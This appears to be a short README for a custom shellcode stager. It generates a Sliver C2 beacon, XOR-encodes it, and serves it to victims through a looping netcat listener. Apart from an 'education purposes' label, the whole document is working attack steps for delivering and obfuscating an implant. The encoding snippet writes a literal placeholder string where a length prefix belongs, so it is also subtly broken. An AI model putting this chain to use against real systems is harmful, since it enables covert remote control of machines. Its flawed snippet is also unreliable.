# CustomStager

Some stager to download and execute shellcode for education purposes

Sliver beacon shellcode```$> generate beacon -S 5 -J 0 -m mtls://127.0.0.1:443 --disable-sgn  --format shellcode```

Python XOR operation:
```python
>>> b = bytearray(open('win_shellcode', 'rb').read())
>>> for i in range(len(b)):
>>>     b[i] ^= 0x23
>>> open('enc_sliver_shellcode', 'wb').write(b'shellcode_littleendian_langth_4_bytes'+b)
```

Custom stager listener:
```bash
$> while true; do nc -lvnp 1337 < enc_sliver_shellcode; done
```
